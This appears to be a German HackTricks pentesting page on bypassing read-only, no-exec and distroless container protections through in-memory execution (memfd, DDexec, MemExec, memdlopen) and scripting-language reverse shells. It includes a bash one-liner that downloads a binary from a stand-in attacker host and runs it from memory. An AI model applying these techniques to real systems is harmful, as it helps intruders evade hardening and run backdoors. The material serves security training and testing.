# FS-Schutz umgehen: read-only / no-exec / Distroless

{{#include ../../../../banners/hacktricks-training.md}}


## Videos

In den folgenden Videos werden die auf dieser Seite erwähnten Techniken ausführlicher erklärt:

- [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4)
- [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU)

## read-only / no-exec-Szenario

Es kommt immer häufiger vor, dass Linux-Rechner mit **read-only (ro) file system protection** eingebunden sind, insbesondere in Containern. Der Grund dafür ist, dass sich ein Container mit ro file system so einfach ausführen lässt, indem man **`readOnlyRootFilesystem: true`** im `securitycontext` setzt:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

Obwohl das file system also als ro eingebunden ist, bleibt **`/dev/shm`** weiterhin beschreibbar. Es ist daher falsch anzunehmen, dass wir nichts auf die Festplatte schreiben können. Dieser Ordner wird jedoch mit **no-exec protection** eingebunden. Wenn du hier also ein Binary herunterlädst, **kannst du es nicht ausführen**.

> [!WARNING]
> Aus Sicht eines red teams erschwert dies das **Herunterladen und Ausführen** von Binaries, die nicht bereits auf dem System vorhanden sind (wie Backdoors oder Enumeratoren wie `kubectl`).

## Einfachster Bypass: Scripts

Beachte, dass ich Binaries erwähnt habe. Du kannst **jedes Script ausführen**, solange sich der Interpreter auf dem Rechner befindet, beispielsweise ein **shell script**, wenn `sh` vorhanden ist, oder ein **python**-**script**, wenn `python` installiert ist.

Das reicht jedoch nicht aus, um dein Binary-Backdoor oder andere Binary-Tools auszuführen, die du möglicherweise benötigst.

## Memory-Bypasses

Wenn du ein Binary ausführen möchtest, das file system dies aber nicht erlaubt, ist die beste Vorgehensweise, es **aus dem Memory auszuführen**, da die **Schutzmaßnahmen dort nicht gelten**.

### FD- und exec-Syscall-Bypass

Wenn sich auf dem Rechner leistungsfähige Script-Engines wie **Python**, **Perl** oder **Ruby** befinden, kannst du das auszuführende Binary in den Memory herunterladen, es in einem Memory-File-Descriptor speichern (`create_memfd` syscall), der von diesen Schutzmaßnahmen nicht betroffen ist, und anschließend einen **`exec` syscall** aufrufen, wobei du den **fd als auszuführende Datei** angibst.

Dafür kannst du einfach das Projekt [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec) verwenden. Du kannst ihm ein Binary übergeben. Daraufhin erzeugt es ein Script in der angegebenen Sprache, in dem das **komprimierte und b64-encodierte Binary** enthalten ist, zusammen mit den Anweisungen, es zu **decodieren und zu dekomprimieren**, in einem durch den Aufruf des `create_memfd` syscall erzeugten **fd** zu speichern und anschließend den **exec** syscall aufzurufen, um es auszuführen.

> [!WARNING]
> Dies funktioniert nicht mit anderen Scripting-Sprachen wie PHP oder Node, da sie **standardmäßig keine Möglichkeit bieten, raw syscalls** aus einem Script aufzurufen. Daher ist es nicht möglich, `create_memfd` aufzurufen, um den **Memory-fd** zum Speichern des Binaries zu erstellen.
>
> Außerdem funktioniert das Erstellen eines **regulären fd** mit einer Datei in `/dev/shm` nicht, da du diese aufgrund der **no-exec protection** nicht ausführen darfst.

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) ist eine Technik, mit der du den **Memory deines eigenen Prozesses** ändern kannst, indem du dessen **`/proc/self/mem`** überschreibst.

Da du dadurch den **Assembly-Code** kontrollierst, der vom Prozess ausgeführt wird, kannst du einen **shellcode** schreiben und den Prozess so „mutieren“, dass er **beliebigen Code** ausführt.

> [!TIP]
> **DDexec / EverythingExec** ermöglicht es dir, deinen eigenen **shellcode** oder **jedes Binary** aus dem **Memory** zu laden und **auszuführen**.
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
Weitere Informationen zu dieser Technik findest du auf Github oder:

{{#ref}}
ddexec.md
{{#endref}}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) ist der nächste logische Schritt von DDexec. Es handelt sich um einen **daemonisierten DDexec-Shellcode**. Wenn du also eine **andere Binary ausführen** möchtest, musst du DDexec nicht erneut starten. Du kannst einfach den Memexec-Shellcode über die DDexec-Technik ausführen und anschließend **mit diesem Daemon kommunizieren, um neue Binaries zum Laden und Ausführen zu übergeben**.

Ein Beispiel für die Verwendung von **memexec zum Ausführen von Binaries aus einer PHP reverse shell** findest du unter [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).

### Memdlopen

Mit einem ähnlichen Zweck wie DDexec ermöglicht die Technik [**memdlopen**](https://github.com/arget13/memdlopen) eine **einfachere Möglichkeit, Binaries in den Speicher zu laden**, um sie später auszuführen. Dadurch können möglicherweise auch Binaries mit Abhängigkeiten geladen werden.

## Distroless Bypass

Eine ausführliche Erklärung dazu, **was distroless eigentlich ist**, wann es hilfreich ist, wann nicht und wie es die Post-Exploitation-Praxis in Containern verändert, findest du unter:

{{#ref}}
../../../containers-namespaces/container-security/distroless.md
{{#endref}}

### Was ist distroless

Distroless-Container enthalten nur die **unbedingt erforderlichen Komponenten zum Ausführen einer bestimmten Anwendung oder eines bestimmten Dienstes**, beispielsweise Bibliotheken und Runtime-Abhängigkeiten. Größere Komponenten wie ein Paketmanager, eine Shell oder Systemwerkzeuge sind jedoch nicht enthalten.

Das Ziel von Distroless-Containern besteht darin, **die Angriffsfläche von Containern durch das Entfernen unnötiger Komponenten zu reduzieren** und die Anzahl der ausnutzbaren Schwachstellen zu minimieren.

### Reverse Shell

In einem Distroless-Container findest du möglicherweise **nicht einmal `sh` oder `bash`**, um eine reguläre Shell zu erhalten. Außerdem findest du keine Binaries wie `ls`, `whoami`, `id` ... also nichts von dem, was du normalerweise auf einem System verwendest.

> [!WARNING]
> Daher wirst du **keine** **reverse shell** erhalten oder das System wie gewohnt **enumerieren** können.

Wenn im kompromittierten Container beispielsweise eine Flask-Webanwendung läuft, ist Python installiert, sodass du eine **Python reverse shell** abrufen kannst. Wenn Node läuft, kannst du eine Node rev shell abrufen; dasselbe gilt für fast jede **Skriptsprache**.

> [!TIP]
> Mit der Skriptsprache kannst du das **System enumerieren**, indem du die Funktionen der jeweiligen Sprache verwendest.

Wenn **keine `read-only/no-exec`**-Schutzmechanismen vorhanden sind, kannst du deine reverse shell missbrauchen, um **deine Binaries in das Dateisystem zu schreiben** und sie **auszuführen**.

> [!TIP]
> In dieser Art von Containern sind solche Schutzmechanismen jedoch normalerweise vorhanden. Du könntest aber die **zuvor beschriebenen Techniken zur Ausführung aus dem Speicher verwenden, um sie zu umgehen**.

Beispiele dafür, wie du einige **RCE-Schwachstellen ausnutzen** kannst, um **reverse shells von Skriptsprachen** zu erhalten und Binaries aus dem Speicher auszuführen, findest du unter [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).


{{#include ../../../../banners/hacktricks-training.md}}
